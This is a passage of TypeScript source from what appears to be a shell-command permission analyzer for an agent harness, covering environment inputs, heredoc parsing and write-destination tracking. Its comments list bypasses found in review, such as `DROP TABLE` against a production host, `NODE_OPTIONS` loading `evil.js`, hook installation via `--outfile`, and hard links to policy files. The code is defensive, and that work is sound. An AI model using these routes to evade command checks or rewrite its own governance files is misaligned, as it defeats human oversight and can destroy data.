  'ls',
  'list',
  'view',
  'info',
  'why',
  'outdated',
  'audit',
  'login',
  'logout',
  'whoami',
  'version',
  'help',
  'workspaces',
  'workspace',
  'import',
  'dedupe',
  'prune',
  'rebuild',
  'root',
  'bin',
  'env',
  'store',
  'patch',
  'fetch',
  'licenses',
  'setup',
  'self-update',
  'approve-scripts',
]);

function defaultReadFile(abs: string): string | null {
  try {
    const st = statSync(abs);
    if (!st.isFile() || st.size > MAX_SCRIPT_BYTES) return null;
    return readFileSync(abs, 'utf8');
  } catch {
    return null;
  }
}

function readInsideWorkspace(ctx: EvaluationContext, abs: string): string | null {
  if (
    !insideRoots(abs, ctx) &&
    !(
      ctx.cwd &&
      canonicalPath(abs)
        .split(sep)
        .join('/')
        .startsWith(canonicalPath(ctx.cwd).split(sep).join('/') + '/')
    )
  )
    return null;
  return (ctx.readFile ?? defaultReadFile)(abs);
}

/** Finds the nearest `name` walking upward. Returns the path when the file EXISTS, whether or not we could read it:
 *  conflating "not there" with "there but unreadable" is what let an oversized or unreadable manifest keep a
 *  declared class's ALLOW (challenge finding 1). The caller decides what an unreadable one means. */
function findUp(ctx: EvaluationContext, start: string, name: string): string | null {
  let dir = resolve(start);
  for (let i = 0; i < 64; i++) {
    const candidate = join(dir, name);
    if (readInsideWorkspace(ctx, candidate) !== null || (insideRoots(candidate, ctx) && fileExists(candidate)))
      return candidate;
    const parent = dirname(dir);
    if (parent === dir || !insideRoots(parent, ctx)) return null;
    dir = parent;
  }
  return null;
}

/* ------------------------------------------------------------------------------------------------------------- *
 * THE VERIFIED EXECUTION ENVIRONMENT (product decision, 2026-09-22).
 *
 * `{cwd, cwdVerified}` was one dimension, and it was the only one EGO made earn its keep. Everything else that
 * decides WHICH BYTES RUN was assumed: the configuration that selects the body (git's core.hooksPath, make's
 * makefile precedence and SHELL, npm's .npmrc), the binding that turns a NAME into a PROGRAM (PATH,
 * node_modules/.bin), the freshness of the sources a conclusion rests on, and the events an operation raises.
 * Each of those silently re-points the analysis at a different reality while the verdict still says RESOLVED.
 *
 * The environment is therefore multi-dimensional, and a positive claim requires the dimensions the claim actually
 * DEPENDS ON to be proven — not all of them, which would gate ordinary work, and not just the directory, which
 * was the hole.
 * ------------------------------------------------------------------------------------------------------------- */

/** WHICH part of an execution closure could not be resolved. Opacity has a scope: a local unknown must not poison
 *  unrelated safe work, and a reader must be able to see what EGO could not see. */
export interface Unresolved {
  what: 'body' | 'config' | 'binding' | 'context' | 'freshness' | 'ambient';
  /** the specific target, file, name or event the gap is about */
  where: string;
  why: string;
}

/** How a bare NAME becomes a PROGRAM in this environment. `default` is the host's ordinary lookup, which EGO does
 *  not model and does not need to: it is the same lookup the operator already trusts. `redefined` means the
 *  environment ITSELF changes the lookup — a makefile assigning PATH or SHELL, an env-injected PATH — and then the
 *  identity of every program the body names is no longer implied by its spelling. */
export interface Binding {
  kind: 'default' | 'redefined';
  why?: string;
}

/** The execution environment a semantic conclusion was computed against. */
export interface ExecutionEnvironment {
  /** the directory this segment's relative operands resolve against */
  cwd: string;
  /** PROVEN only when that directory exists and lies inside a registered repository root. A dynamic `cd`, an
   *  unresolvable `-C`, an unmodelled workspace selector or a logical/physical disagreement all clear it. */
  cwdVerified: boolean;
  /** CONFIGURATION CLOSURE: what EGO read to know which body executes, and what it could not read. A positive
   *  claim is valid only when this is complete enough for the claim being made. */
  config: { read: string[]; unresolved: Unresolved[] };
  /** BINDING RESOLUTION: see `Binding`. */
  binding: Binding;
  /** The segment EXACTLY as written, before normalization de-quoted it. A producer that reads its own command
   *  line needs the quoting: `make V="git push origin main" run` normalizes to five bare words, and the override's
   *  value then looked like four separate targets (exit review 5). */
  rawSegment?: string;
  /** True when the body being analysed runs INSIDE a container image, so its paths are the image's and not the
   *  workspace's. `RUN go build -o /out/app .` and `RUN cp entrypoint.sh /usr/local/bin/` write nothing on the
   *  host, and judging them as host paths denied the two most generic Dockerfile idioms there are — a
   *  proportionality defect introduced by the Dockerfile producer itself (exit review 8). The COMMANDS are still
   *  classified: a `git push` or a `curl … | sh` inside a RUN is as real as anywhere else. */
  containerPaths?: boolean;
  /** Names DEFINED IN THIS UNIT whose body the analyzer already read — a shell function. A call to one of them
   *  executes text that is already accounted for, so it is neither an unknown producer nor an unresolved binding:
   *  EGO knows exactly what the name means. An ALIAS is not here, because its body is not handed over. */
  definedNames?: ReadonlySet<string>;
  /** TRANSITIVE FRESHNESS: canonical paths that an earlier unit of THIS COMMAND writes. Shared and mutated in
   *  place across every depth, so a write inside a producer body invalidates a later conclusion outside it —
   *  `./configure && make` must not reuse the Makefile configure just rewrote. */
  written: Set<string>;
  /** fingerprints of the sources this environment was built from, so a conclusion can be re-checked */
  sources: Record<string, string>;
  /** ENVIRONMENT-INPUT CLOSURE: the leading `VAR=value` assignments of this segment that MATERIALLY change
   *  execution semantics — which makefile is read, which interpreter runs a script, where a program is looked up.
   *  `normalizeSegment` strips assignments before the producer boundary, so a producer could satisfy
   *  "configuration-complete" VACUOUSLY about a tool the same command line had just re-pointed. Only the inputs
   *  needed to justify a semantic claim are captured; EGO does not model the environment. */
  envInputs: Record<string, string>;
  /** TREE-STATE PROVENANCE: false once an earlier unit of this command may have replaced the repository content
   *  that later conclusions rest on — a checkout, reset, stash pop, merge, rebase or worktree switch rewrites an
   *  unenumerable set of files, which the per-path write ledger cannot express. Recorded IN the shared ledger
   *  under a sentinel, because that is the mechanism already proven to cross the producer boundary: a checkout
   *  inside a script body must invalidate a conclusion drawn after it, one level up (challenge 8). */
  readonly treeFresh: boolean;
}

/** The environment of a fresh top-level invocation: nothing proven that was not checked. */
export function baseEnvironment(cwd: string, cwdVerified: boolean): ExecutionEnvironment {
  return {
    cwd,
    cwdVerified,
    config: { read: [], unresolved: [] },
    binding: { kind: 'default' },
    written: new Set(),
    sources: {},
    envInputs: {},
    get treeFresh(): boolean {
      return !this.written.has(TREE_DIRTY);
    },
  };
}

/** Ledger sentinel for "an earlier unit of this command replaced repository content". */
const TREE_DIRTY = '\0tree';

/** A child environment for a resolved body: a new directory and its own configuration, but the SAME write ledger,
 *  because freshness is a property of the command, not of one producer. */
function childEnvironment(
  parent: ExecutionEnvironment,
  over: Partial<Omit<ExecutionEnvironment, 'written'>>,
): ExecutionEnvironment {
  return {
    cwd: over.cwd ?? parent.cwd,
    cwdVerified: over.cwdVerified ?? parent.cwdVerified,
    config: over.config ?? { read: [], unresolved: [] },
    binding: over.binding ?? parent.binding,
    written: parent.written, // SHARED, never copied: this is what makes freshness transitive
    sources: { ...parent.sources, ...(over.sources ?? {}) },
    // a producer's body inherits the process inputs of the invocation that produced it; tree freshness is read
    // from the SHARED ledger, so it crosses the producer boundary in both directions
    envInputs: over.envInputs ?? parent.envInputs,
    get treeFresh(): boolean {
      return !parent.written.has(TREE_DIRTY);
    },
  };
}

/** Which process inputs materially change what each producer resolves. EGO does not model the environment: it
 *  captures only the inputs required to justify the semantic claim the producer is about to make. */
const PROGRAM_NAMING_ENV =
  /^(EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*RUNNER|CARGO_BUILD_[A-Z0-9_]*(WRAPPER|RUSTC|RUSTDOC)|RUSTC_WRAPPER|RUSTC|LD_PRELOAD|DYLD_[A-Z_]+|GOFLAGS|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS)$/;

const RELEVANT_ENV_INPUTS: Record<ProducerResult['kind'], readonly RegExp[]> = {
  // A variable whose VALUE IS A PROGRAM re-points the tool itself, so it is relevant to EVERY producer and to no
  // producer at all — `EDITOR=<prog> git commit` and `CC=<prog> make build` run <prog> whichever branch resolved
  // the body. Listing it per kind meant it was relevant where someone remembered to list it.
  // A MAKE RECIPE CAN RUN ANY TOOL, so every variable that changes what a tool executes is relevant to it — not
  // only make's own. `export NODE_OPTIONS := --require=./evil.js` makes every Node tool in every recipe load
  // that file, and the recipe text says nothing about it (exit review 8).
  'make-target': [
    PROGRAM_NAMING_ENV,
    /^(MAKEFILES|MAKEFLAGS|GNUMAKEFLAGS|MAKE|SHELL|PATH|NODE_OPTIONS|NODE_PATH|PYTHONPATH|PYTHONSTARTUP|PERL5OPT|RUBYOPT|BASH_ENV|ENV|GEM_PATH|CLASSPATH|JAVA_TOOL_OPTIONS)$/,
  ],
  'npm-script': [
    PROGRAM_NAMING_ENV,
    /^(npm_config_[a-z_]+|YARN_[A-Z_]+|PNPM_[A-Z_]+|BUN_[A-Z_]+|SHELL|PATH|NODE_OPTIONS|NODE_PATH)$/,
  ],
  'shell-script': [PROGRAM_NAMING_ENV, /^(SHELL|BASH_ENV|ENV|PATH|CDPATH)$/],
  'git-ambient': [PROGRAM_NAMING_ENV, /^(GIT_[A-Z_]+|PATH)$/],
  // PATH and CDPATH re-point ANY bare name, so they are relevant even where no producer ran
  none: [PROGRAM_NAMING_ENV, /^(PATH|CDPATH)$/],
};

/** ENVIRONMENT-INPUT CLOSURE and TREE-STATE PROVENANCE, applied at the ONE place that knows which producer ran —
 *  so every producer, current and future, is covered without having to remember. */
function environmentGaps(kind: ProducerResult['kind'], env: ExecutionEnvironment): Unresolved[] {
  const gaps: Unresolved[] = [];
  for (const [name, value] of Object.entries(env.envInputs))
    // ...but a VALUE that cannot name a program does not change what runs: `NODE_OPTIONS=--max-old-space-size`
    // raises the V8 heap, which is the standard fix for an out-of-memory build, and reporting it as an
    // unresolved context made `npm test` ask (exit review 7).
    if (RELEVANT_ENV_INPUTS[kind].some((re) => re.test(name)) && envInjects(name, `${name}=${value}`))
      gaps.push({ what: 'context', where: name, why: `the environment sets ${name}=${value}, which changes what runs` });
  if (!env.treeFresh && kind !== 'none')
    gaps.push({
      what: 'freshness',
      where: 'tree-state',
      why: 'an earlier unit of this command replaces repository content, so this conclusion is a pre-image',
    });
  return gaps;
}

/** A configuration named on the COMMAND LINE rather than found on disk: `eslint --config x.js`, `vite -c v.ts`.
 *  The file lookup could never see it, so the same closure escaped through a different spelling. */
function commandLineConfig(tokens: string[], cwd: string): string | null {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^(?:--config=|--configfile=|--conf=|-c)(.+)$/.exec(t);
    const value =
      (t === '--config' || t === '--configfile' || t === '--conf' || t === '-c') && tokens[i + 1]
        ? tokens[++i]!
        : (eq?.[1] ?? null);
    if (value === null) continue;
    if (/\.(js|mjs|cjs|ts|mts|cts|py|rb)$/.test(value)) return isAbsolute(value) ? value : join(cwd, value);
  }
  return null;
}

/** A DATA configuration that NAMES code is not a bounded closure: `.eslintrc.json` with `"plugins": ["x"]` makes
 *  the tool import and run `eslint-plugin-x`. The file is data; what it points at is not. Returns the config that
 *  names code, or undefined when the tool's configuration names none. */
function dataConfigNamingCode(ctx: EvaluationContext, cwd: string, tool: string): string | null {
  // the DATA configuration each tool really reads: its own dotfile, its own ini/toml, and the shared files its
  // ecosystem puts tool sections in. Looking only for `.<tool>rc*` and `package.json` missed `mypy.ini`,
  // `setup.cfg`, `pyproject.toml` and `.rubocop.yml` — the files those tools actually use.
  const names = [
    `.${tool}rc`,
    `.${tool}rc.json`,
    `.${tool}rc.yml`,
    `.${tool}rc.yaml`,
    `.${tool}rc.toml`,
    `.${tool}.yml`,
    `.${tool}.yaml`,
    `${tool}.config.json`,
    `${tool}.json`,
    `${tool}.ini`,
    `${tool}.cfg`,
    `${tool}.toml`,
    'setup.cfg',
    'pyproject.toml',
    'tox.ini',
    'Gemfile',
    'package.json',
  ];
  for (const n of names) {
    const f = findUp(ctx, cwd, n);
    if (f === null) continue;
    const text = readInsideWorkspace(ctx, f);
    if (text === null) return f; // a configuration EGO cannot read cannot be shown to name no code
    const scope =
      n === 'package.json'
        ? (() => {
            try {
              const v = (JSON.parse(text) as Record<string, unknown>)[tool];
              return v === undefined ? '' : JSON.stringify(v);
            } catch {
              return '';
            }
          })()
        : text;
    // `plugins` and the rest always name a package the tool imports. `extends` is the exception: a value in the
    // tool's OWN namespace (`eslint:recommended`) is built in and loads nothing, so flagging it would gate the
    // most ordinary configuration there is.
    // JSON writes `"plugins": ["x"]`, YAML writes `plugins:` then a list on the following lines. Requiring a
    // bracket on the same line saw only the JSON shape (decision challenge, finding 6).
    // JSON writes `"plugins": [...]`, YAML writes `plugins:` then a list, INI and TOML write `plugins = ...`.
    // Requiring a colon saw only the first two, so `mypy.ini` with `plugins = evil.py` read as plain data.
    if (
      /(^|["\s])(plugins|presets|preset|require|requires|loader|transform)["\s]*[:=]\s*(\[|\{|["']|\S|\r?\n\s*-)/m.test(
        scope,
      )
    )
      return f;
    const ext = /["\s]extends["\s]*[:=]\s*(\[[^\]]*\]|"[^"]*")/.exec(scope);
    if (ext) {
      const values = [...ext[1]!.matchAll(/"([^"]+)"/g)].map((m) => m[1]!);
      if (values.some((v) => !v.startsWith(`${tool}:`))) return f;
    }
  }
  return null;
}

/** Operations that replace repository content wholesale. Listed by what they DO, not by spelling: each one swaps
 *  an unenumerable set of tracked files, so a conclusion drawn from repository content before it is a pre-image. */
const TREE_CHANGING =
  /^git\s+(checkout|switch|restore|reset|merge|rebase|cherry-pick|revert|stash|pull|am|apply|clean|worktree|submodule|sparse-checkout|read-tree|lfs|bisect|filter-branch)\b/;

/** Leading `VAR=value` assignments of a segment. Only the names below are kept: the ones that decide WHICH FILE a
 *  tool reads or WHICH PROGRAM it runs. Everything else is ordinary parameterisation and is not execution input. */
const EXECUTION_ENV_INPUTS =
  // ... plus the variables whose VALUE IS A PROGRAM the tool will run: an editor, a pager, a diff or merge
  // driver, an askpass helper. `EDITOR=<prog> git commit` runs <prog> (decision challenge, finding 33).
  /^(MAKEFILES|MAKEFLAGS|MAKE|GNUMAKEFLAGS|SHELL|BASH_ENV|ENV|PS4|BASH_XTRACEFD|CDPATH|PATH|NODE_OPTIONS|NODE_PATH|npm_config_[a-z_]+|YARN_[A-Z_]+|PNPM_[A-Z_]+|BUN_[A-Z_]+|PYTHONPATH|PYTHONSTARTUP|PERL5OPT|RUBYOPT|GIT_[A-Z_]+|LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]+|EDITOR|VISUAL|PAGER|DIFFPROG|MERGE|SSH_ASKPASS|SUDO_ASKPASS|TERMINAL|BROWSER|MANPAGER|LESSOPEN|LESSCLOSE|CC|CXX|LD|AR|RANLIB|OBJCOPY|CARGO_TARGET_[A-Z0-9_]*RUNNER|RUSTC_WRAPPER|RUSTC|CARGO_BUILD_RUSTC_WRAPPER|CARGO_BUILD_RUSTC|CARGO_BUILD_RUSTDOC|RUSTDOC|SWIFT_EXEC|JAVA_TOOL_OPTIONS|JDK_JAVA_OPTIONS|_JAVA_OPTIONS|LD_AUDIT|BUILDX_BUILDER|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|KUBECONFIG|KUBE_CONTEXT|AWS_ENDPOINT_URL|AWS_ENDPOINT_URL_[A-Z0-9_]+|AWS_S3_ENDPOINT|CLOUDSDK_API_ENDPOINT_OVERRIDES_[A-Z0-9_]+|(?:STORAGE|PUBSUB|FIRESTORE|DATASTORE|BIGTABLE|SPANNER)_EMULATOR_HOST|GOFLAGS|GOTOOLCHAIN|RUSTFLAGS|CGO_[A-Z]+|CFLAGS|CXXFLAGS|LDFLAGS|MAKEFLAGS)$/;

export function segmentEnvInputs(segment: string): Record<string, string> {
  const out: Record<string, string> = {};
  // A CONTAINER'S `-e` SETS THE CONTAINER'S ENVIRONMENT, not this shell's. `docker run --rm -e SHELL=/bin/sh
  // myapp` starts a throwaway local container with one variable set; reading it as a host binding classified an
  // ordinary local run as an execution override (exit review 7). What the container does with it is the
  // container's business, and the image is already an unmodelled producer.
  if (/^(docker|podman|nerdctl)\b/.test(segment.trim())) return out;
  // `VAR=x cmd`, `env VAR=x cmd`, `env -- VAR=x cmd`, `env -S 'VAR=x cmd'`, and the same behind any wrapper
  // (`timeout 60 env VAR=x cmd`). Anchoring on the LEADING position only made the dimension blind to spellings
  // the normalizer already knew how to parse — two readers for one dimension (challenge 8, finding 1).
  const scan = (text: string): void => {
    let s = text.trim();
    for (;;) {
      // skip wrappers and their options so `timeout 60 env FOO=1 make` is reached
      const w = /^(\S+)\s+/.exec(s);
      // `sudo`, `doas` and `xargs` are NOT transparent for the verdict — sudo keeps `command.privileged` — but
      // they are transparent for the ENVIRONMENT: `sudo DOCKER_HOST=tcp://prod… docker exec` really does set that
      // variable for the command. Stopping at them left the normalized `docker exec` with no engine to resolve,
      // so a shell on a production daemon asked instead of being denied (exit review 6, generated cross-product).
      if (w && (WRAPPERS.has(w[1]!) || /^(timeout|sudo|doas|xargs|--)$/.test(w[1]!))) {
        s = s.slice(w[0].length);
        continue;
      }
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=('[^']*'|"[^"]*"|\S*)\s+/.exec(s);
      if (m) {
          // npm matches `npm_config_*` case-insensitively, so `npm_config_SCRIPT_SHELL` is the same setting
      const name = /^npm_config_/i.test(m[1]!) ? m[1]!.toLowerCase() : m[1]!;
      // THE TARGET-SELECTING NAMES ARE ENVIRONMENT INPUTS TOO. `PGHOST`, `MYSQL_HOST`, `KUBECONFIG` and their
      // siblings live in TARGET_ENV_RE, which the NORMALIZER consults to re-attach an assignment to the segment
      // it configures. They were absent from this set, so a standalone `export PGHOST=prod-db.acme.com` carried
      // nothing to the next segment and `export PGHOST=… && psql -c 'DROP TABLE users'` was ALLOW, while the
      // one-segment spelling was an absolute deny (exit review 7).
      if (EXECUTION_ENV_INPUTS.test(name) || TARGET_ENV_RE.test(name))
        out[name] = m[2]!.replace(/^['"]|['"]$/g, '');
        s = s.slice(m[0].length);
        continue;
      }
      // a numeric or flag operand of a wrapper (`timeout 60`, `env -C dir`, `nice -n 5`)
      const opt = /^(-\S*|\d+\S*)\s+/.exec(s);
      if (opt && /^(-|\d)/.test(opt[1]!)) {
        s = s.slice(opt[0].length);
        // an option's VALUE is not a command either: `sudo -u root -H VAR=x cmd` stopped the scan at `root`
        if (/^(-u|-g|-p|-C|-U|-r|-t|-D|--user|--group|--prompt|--role|--type|--chdir)$/.test(opt[1]!)) {
          const val = /^(\S+)\s+/.exec(s);
          if (val && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(val[1]!)) s = s.slice(val[0].length);
        }
        continue;
      }
      break;
    }
  };
  scan(segment);
  // `env -S 'VAR=x cmd'` carries a whole command line in one quoted value
  for (const carried of carrierCommandValues(segment)) scan(carried);
  return out;
}

interface EffectState {
  depth: number;
  seen: Set<string>;
  env: ExecutionEnvironment;
}

function stripComment(line: string): string {
  let out = '';
  let quote: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (quote) {
      out += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '$' && line[i + 1] === "'") {
      // `$'…'` again: the same ANSI-C string, in the reader that strips comments from a SCRIPT line
      let j = i + 2;
      out += "$'";
      while (j < line.length) {
        if (line[j] === '\\' && j + 1 < line.length) {
          out += line[j]! + line[j + 1]!;
          j += 2;
          continue;
        }
        if (line[j] === "'") break;
        out += line[j]!;
        j++;
      }
      out += "'";
      i = j;
      continue;
    }
    if (ch === "'" || ch === '"') quote = ch;
    // THE SAME WORD BOUNDARY THE SPLITTER USES. This reader kept the narrow `/\s/` test after the splitter's was
    // widened, so `;#`, `&&#`, `|#` and `)#` comments were never stripped from a SCRIPT line or a HOOK body. A
    // line reading `echo a;#<<true` then opened a phantom heredoc named `true` that swallowed the `git push` on
    // the next line — in a plain `bash ./x.sh`, and in `.git/hooks/pre-commit`, which turns an ordinary
    // `git commit` into a remote push (exit review 7). A fix that lands at one of two readers of the same rule is
    // the meta-defect this repository has met before; both readers now share the class.
    else if (ch === '#' && (i === 0 || /[\s;&|()]/.test(line[i - 1]!))) break;
    out += ch;
  }
  return out;
}

/** `$[ … ]` is the OLD arithmetic form, still accepted by bash: its `<<` is a left shift, exactly as inside
 *  `$(( … ))`. Leaving it alone let `echo $[1<<true]` open a heredoc whose delimiter never arrived, so every
 *  remaining line of the script was read as its body (exit review 8). */
const OLD_ARITH_RE = /\$\[[^\]]*\]/g;

/** The heredoc delimiter a line opens, or null. A `<<` only opens one when it is UNQUOTED, is not the `<<<`
 *  herestring, and is not the left-shift operator inside an arithmetic expansion. Matching `<<` anywhere on the
 *  line made `grep -rn "<<<<<<< HEAD" .`, `echo "shift << Bits"`, `cat <<< ready` and `echo $((1<<BITS))` open a
 *  heredoc whose delimiter never arrives — so every REMAINING line of the script, hook or recipe was skipped as
 *  though it were data, and a `git push` or a `chmod 777 /etc/passwd` below it was never classified at all
 *  (exit review 4). */
function heredocDelimiter(line: string): string | null {
  // `$[ … ]` and `$(( … ))` both hold ARITHMETIC, where `<<` is a left shift. Blanking the old form here is what
  // keeps `echo $[1<<true]` from opening a heredoc whose delimiter never arrives (exit review 8).
  line = line.replace(OLD_ARITH_RE, '$ARITH');
  let quote: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const c = line[i]!;
    if (c === '\\') {
      i++;
      continue;
    }
    if (quote) {
      if (c === quote) quote = null;
      continue;
    }
    if (c === "'" || c === '"') {
      quote = c;
      continue;
    }
    // an arithmetic expansion is where `<<` is a left shift, not a redirection
    if (c === '$' && line[i + 1] === '(' && line[i + 2] === '(') {
      let depth = 0;
      let j = i + 1;
      for (; j < line.length; j++) {
        if (line[j] === '(') depth++;
        else if (line[j] === ')' && --depth === 0) break;
      }
      i = j;
      continue;
    }
    if (c === '<' && line[i + 1] === '<') {
      if (line[i + 2] === '<') {
        i += 2; // `<<<` is a herestring: it carries DATA, and opens nothing
        continue;
      }
      const m = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_][A-Za-z0-9_]*))/.exec(line.slice(i));
      if (m) return m[1] ?? m[2] ?? m[3] ?? null;
      i++;
    }
  }
  return null;
}

/** Splits shell script text into classifiable segments, returning null when the script is opaque (dynamic commands). */
function scriptSegments(text: string): string[] | null {
  // PRODUCER CONTRACT: resolve WHICH lines execute, and hand every one of them over verbatim. Nothing is dropped
  // for looking harmless — that judgement belongs to the canonical analyzer, which classifies shell structure as
  // read-only itself. A heredoc BODY is data the script feeds to a command, not commands, so it is not emitted as
  // executable text; `eval` and a `$`-headed command cannot be resolved at all and are reported as UNKNOWN.
  const out: string[] = [];
  let heredoc: string | null = null;
  let heredocQuoted = false;
  let heredocOpener = '';
  let heredocBody = '';
  // A BACKSLASH-NEWLINE IS ERASED BEFORE THE SHELL SEES THE COMMAND. Splitting on the raw newline first cut
  // `git \` + newline + `push origin main` into two unclassifiable fragments, so an absolute core deny reached
  // ASK from inside a script while the same continuation typed directly was denied (exit review 4).
  for (const raw of text.replace(/\\\r?\n[ \t]*/g, ' ').split(/\r?\n/)) {
    if (heredoc !== null) {
      if (raw.trim() !== heredoc) {
        heredocBody += raw + '\n';
        continue;
      }
      // the body is over: hand over whatever the SHELL would run out of it — the whole body when the reader takes
      // its program from stdin, the substitutions when the delimiter was unquoted, nothing when it was quoted
      // a script is read LINE BY LINE here, so the splitter's `case` state does not persist across lines and a
      // branch's `a)` is still glued to the opener; it is structure either way, and stripped before the role test
      const openerCommand = (sg: string): string => emitterTail(sg.replace(/^\(?\s*[^\s()|;&]+\s*\)\s+(?=\S)/, ''));
      if (splitShellSegments(heredocOpener).some((sg) => readsScriptFromStdin(openerCommand(sg)))) {
        const nested = scriptSegments(heredocBody);
        if (nested === null) return null; // the carried script is opaque, so this one is too
        out.push(...nested);
      }
      else if (!heredocQuoted) out.push(...substitutionsIn(heredocBody));
      heredoc = null;
      heredocBody = '';
      continue;
    }
    const line = stripComment(raw).trim();
    if (!line || line.startsWith('#!')) continue;
    heredoc = heredocDelimiter(line);
    if (heredoc !== null) {
      heredocOpener = line;
      heredocQuoted = new RegExp(`<<-?\\s*(?:'${heredoc}'|"${heredoc}"|\\\\${heredoc})(?!\\w)`).test(line);
    }
    // an `eval` or a command built from a variable cannot be resolved: report UNKNOWN rather than guess
    for (const seg of splitShellSegments(line)) {
      for (const n of normalizeSegment(seg)) {
        const head = /^(\S+)/.exec(n)?.[1] ?? '';
        if (head === 'eval' || /^["']?\$/.test(head)) return null;
      }
    }
    // THE BODY HAS ALREADY BEEN REMOVED HERE, so the opener's `<<DELIM` must go with it. Leaving it in handed the
    // canonical splitter a heredoc whose delimiter can never arrive, and it consumed every remaining line of the
    // script as that body — a script with any heredoc hid everything below it, at ALLOW (exit review 4).
    out.push(heredoc === null ? line : line.replace(/<<-?\s*(?:'[^']*'|"[^"]*"|\\?[A-Za-z_][A-Za-z0-9_]*)/g, '').trim());
  }
  // A HEREDOC THAT NEVER CLOSES MEANS THE SCRIPT WAS MISREAD: everything after it was skipped as data, so the set
  // of commands resolved here is not the set that will run. Report opacity rather than a short list.
  if (heredoc !== null) return null;
  return out;
}

/** True when the path exists on disk AND is a directory. A3: an invocation directory that is not there cannot be
 *  the proven base of a relative resolution. */
function directoryExists(abs: string): boolean {
  try {
    return statSync(abs).isDirectory();
  } catch {
    return false;
  }
}

/** Destination operands of the write-ish commands, resolved against `cwd`. Feeds the A4 freshness ledger so that
 *  `cp evil.mk Makefile && make build` can no longer be judged from the Makefile that was replaced. */
function writtenPathOperands(segment: string, cwd: string): string[] {
  const tokens = tokenize(segment);
  const head = tokens[0] ?? '';
  const operands = tokens.slice(1).filter((t) => !t.startsWith('-') && !t.includes('='));
  const out: string[] = [];
  const abs = (t: string): string => (isAbsolute(t) ? t : resolve(cwd, t));
  if (head === 'git' && /^(checkout|restore|clone)$/.test(operands[0] ?? '')) {
    // `--` IS OPTIONAL, AND GIT SAYS SO. `git checkout HEAD~1 control-plane/permissions/matchers.md` overwrites
    // that file from an arbitrary tree-ish exactly as the `--` spelling does, and `git checkout origin/evil
    // .harness` replaces the whole governance tree; only the dash-dash form was read, so the plain one was ALLOW
    // while the identical act with two extra characters was an absolute deny (exit review 7). Without `--`, the
    // first operand may be a tree-ish and everything after it is a pathspec; `git clone URL DIR` writes DIR.
    const dd = tokens.indexOf('--');
    if (dd >= 0) out.push(...tokens.slice(dd + 1).map(abs));
    else if (operands[0] === 'clone') {
      const dir = operands.slice(1).filter((t) => !/^[a-z+]+:\/\/|@.*:|^git@/.test(t))[1];
      if (dir) out.push(abs(dir));
    } else {
      // `git checkout .` and `git checkout src/` name a pathspec directly; with a tree-ish in front, the rest do
      const rest = operands.slice(1);
      const treeish = rest.length > 1 && !/[/.]/.test(rest[0]!) ? 1 : 0;
      out.push(...rest.slice(treeish).map(abs));
    }
  } else if (/^(cp|mv|install|rsync|ln)$/.test(head) && operands.length >= 2) {
    out.push(abs(operands[operands.length - 1]!));
    // A HARD LINK IS A SECOND NAME FOR THE SAME INODE. `cp -l control-plane/permissions/absolute-denies.md
    // /tmp/alias` makes the governed file writable through a path no rule covers, and the same is true of
    // `ln` without `-s`. The SOURCE is therefore part of the act, which is why it is added to the ledger here
    // (exit review 7).
    if ((head === 'ln' && !tokens.includes('-s')) || (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t))))
      out.push(...operands.slice(0, -1).map(abs));
  }
  else if (/^(tee|truncate|touch)$/.test(head))
    // a device sink is a DISCARD, exactly as it is for `> /dev/null`, which redirectionTargets already knows;
    // `ls | tee /dev/null` was classified as an outside-workspace write (exit review 5)
    out.push(...operands.filter((t) => !isDeviceDiscard(t)).map(abs));
  else if (head === 'dd') {
    const of = tokens.find((t) => t.startsWith('of='));
    if (of) out.push(abs(of.slice(3)));
  } else if (/^(sed|gsed|perl|ruby|gawk)$/.test(head) && tokens.some((t) => /^-[a-z]*i/.test(t) || t === '--in-place') && operands.length)
    out.push(...operands.slice(1).map(abs));
  // A BUILD TOOL'S OUTPUT FLAG IS A WRITE DESTINATION. Every bundler, compiler and archiver names where it writes
  // with a flag, and none of them were read: `esbuild src/a.ts --outfile=.git/hooks/pre-commit` installed a git
  // hook, `--outfile=control-plane/permissions/matchers.md` rewrote the policy that decides every later verdict,
  // and `--outfile=.harness/runtime/pin.json` wrote runtime state the kernel alone may write — all at ALLOW,
  // while the same bytes through `cp` or `>` were absolute denies (exit review 7). The flag names the file
  // whatever the tool is, so the rule is about the FLAG, not about an enumerated list of tools.
  for (const [i, t] of tokens.entries()) {
    const eq = OUTPUT_FLAG_RE.exec(t);
    if (eq?.[2]) out.push(abs(eq[2]));
    else if (eq && tokens[i + 1] && !tokens[i + 1]!.startsWith('-')) out.push(abs(tokens[i + 1]!));
    // buildx writes to the host with `--output type=local,dest=PATH` (and `-o` with the same value shape)
    const bx = /(?:^|,)dest=([^,\s]+)/.exec(t);
    if (bx?.[1]) out.push(abs(bx[1]));
  }
  return out;
}

/** The flags with which a tool names the file or directory it WRITES. `-o` is deliberately absent: it is `grep -o`,
 *  `git blame -o` and `ps -o` far more often than it is an output file, and the tools where it means a destination
 *  (`go build -o`, `curl -o`) are matched by their own rules. */
const OUTPUT_FLAG_RE =
  /^(?:--(?:outfile|out-file|out-dir|outdir|output-dir|output-directory|output-path|output-file|output|dist-dir|dest|destination|emit-to|out)|--file|-D|--directory)(?:=(.*))?$/;

/** True when a segment writes an UNENUMERABLE set of files: an archive extraction, or a recursive copy whose
 *  destination is a directory. The per-path ledger cannot express either, and `tar -xf p.tar -C sub && make -C sub
 *  build` was judged from a Makefile the extraction may have just replaced. */
function writesUnenumerably(segment: string): boolean {
  const tokens = tokenize(segment);
  const head = tokens[0] ?? '';
  if (/^(tar|bsdtar|gtar|pax)$/.test(head))
